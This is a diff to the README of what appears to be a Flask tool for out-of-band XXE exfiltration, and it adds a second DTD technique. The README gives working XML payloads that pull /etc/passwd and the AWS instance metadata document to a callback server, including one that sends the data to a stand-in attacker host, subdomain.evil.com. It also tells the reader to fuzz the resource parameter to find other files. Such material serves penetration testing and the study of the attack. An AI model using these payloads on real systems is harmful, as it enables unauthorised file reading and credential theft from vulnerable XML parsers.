@@ -31,14 +31,16 @@ Change to the directory of `app.py` and run the following command, specifying th
 flask run -p <port> -h <interface-ip>
 ```
 
-Once the server is running, you can generate DTDs in two different ways, depending on the exfiltration technique you wish to use:
+Once the server is running, you can generate DTDs in three different ways, depending on the exfiltration technique you wish to use. Note that the payload required is different for each technique.
 
-### Out-of-Band Exfiltration
+### Out-of-Band Exfiltration #1
 
-For Out-of-Band exfiltration, use the /oob.dtd path to generate dynamic DTDs. You can use the following payload in your XML documents, updating the `<server-ip>`, `<port>`, and `resource` parameter to appropriate values:
+For Out-of-Band exfiltration using a parameter entity, use the /oob.dtd path to generate dynamic DTDs. You can use the following payload in your XML documents, updating the `<server-ip>`, `<port>`, and `resource` parameter to appropriate values:
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?resource=file:///etc/passwd"> %xxe;]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?resource=file:///etc/passwd"> %xxe;]>
+<root></root>
 ```
 
 If the attack is successful, the contents of the /etc/passwd file (using the above example) should appear in the access logs of the `callback` server specified earlier. Note that for some parsers, only the first line of the file may get sent.
@@ -46,14 +48,32 @@ If the attack is successful, the contents of the /etc/passwd file (using the abo
 You can also set the `callback` server dynamically in the payload by using a `callback` parameter in the URL, setting it in the same way as in the script (i.e. including the scheme, port number if it is non-standard, and leaving off the trailing slash):
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?callback=https://subdomain.evil.com:8443&resource=file:///etc/passwd"> %xxe;]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?callback=https://subdomain.evil.com:8443&resource=file:///etc/passwd"> %xxe;]>
+<root></root>
 ```
 
 Once the `<server-ip>` and `<port>` are set in the payload, the value of the `resource` parameter can be fuzzed to try and find different files, or can be replaced by other URI schemes (e.g. http, https). For example, the following payload can be used to try and extract information from the AWS Instance Metadata API:
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?resource=http://169.254.169.254/latest/dynamic/instance-identity/document"> %xxe;]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?resource=http://169.254.169.254/latest/dynamic/instance-identity/document"> %xxe;]>
+<root></root>
 ```
+
+### Out-of-Band Exfiltration #2
+
+As an alternative Out-of-Band exfiltration technique using a regular entity (&amp;oob;), use the /oob2.dtd path to generate dynamic DTDs. You can use the following payload in your XML documents, updating the `<server-ip>`, `<port>`, and `resource` parameter to appropriate values. Ensure the &amp;oob; entity is contained within the XML document itself.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root SYSTEM "http://<server-ip>:<port>/oob2.dtd?resource=file:///etc/passwd">
+<root>&oob;</root>
+```
+
+If the attack is successful, the contents of the /etc/passwd file (using the above example) should appear in the access logs of the `callback` server specified earlier. Again, note that for some parsers, only the first line of the file may get sent.
+
+As with the previous Out-of-Band technique, you can also set the `callback` server dynamically in the payload by using a `callback` parameter in the URL.
 
 ### Error Message Exfiltration
 
